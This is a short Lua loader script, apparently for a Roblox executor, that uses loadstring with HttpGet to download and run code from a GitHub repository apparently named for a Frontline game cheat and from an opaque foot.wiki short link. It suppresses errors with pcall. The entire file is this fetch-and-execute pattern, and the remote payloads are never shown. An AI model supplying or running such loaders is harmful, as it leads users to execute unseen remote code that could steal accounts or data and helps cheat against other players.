-- Only allow execution once
if not _G.MasterLoaded then
    _G.MasterLoaded = true

    -- 1. Runs the GitHub Script
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/scrupts0011/Frontlineshvhbylouis/main/Main.lua"))()
    end)

    -- 2. Runs the foot.wiki Script automatically
    pcall(function()
        loadstring(game:HttpGet("https://foot.wiki/QIOVDF"))()
    end)

else
    print("Scripts are already active.")
end
